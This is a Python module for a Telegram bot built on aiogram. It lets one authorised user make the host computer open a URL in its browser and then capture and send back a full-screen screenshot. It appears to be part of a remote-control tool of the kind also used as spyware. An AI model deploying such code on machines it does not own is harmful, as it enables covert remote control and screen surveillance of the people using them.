##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.types import FSInputFile
from config import ALLOWED_USER_ID, directory, bot
from lib.states import url
from lib.texts import TEXTS, user_languages

import webbrowser
import asyncio
import pyautogui
import os

def register_open_url(dp):
    @dp.message(F.text.lower() == "открыть ссылку")
    @dp.message(F.text.lower() == "open url")
    @dp.message(Command("open_url"))
    async def open_url_start(message: types.Message, state: FSMContext):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id == ALLOWED_USER_ID:
            await message.answer(TEXTS[lang]['enter_url'])
            await state.set_state(url.waiting_url)
        else:
            await message.answer(TEXTS[lang]['access_denied'])

    @dp.message(url.waiting_url)
    async def open_url_process(message: types.Message, state: FSMContext):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id == ALLOWED_USER_ID:
            url_to_open = message.text
            webbrowser.open(url_to_open)

            # Задержка в 5 секунд
            await asyncio.sleep(5)
            await message.answer(TEXTS[lang]['url_opened'])

            # Делаем скриншот всего экрана
            screenshot = pyautogui.screenshot()
            filename = "screenshot.png"
            filepath = os.path.join(directory, filename)

            # Создаем директорию, если её нет
            os.makedirs(directory, exist_ok=True)
            screenshot.save(filepath)

            # Отправка скриншота
            photo = FSInputFile(filepath)
            await message.answer_photo(photo)

            # Удаление файла после отправки
            if os.path.exists(filepath):
                os.remove(filepath)

            await state.clear()
        else:
            await message.answer(TEXTS[lang]['access_denied'])
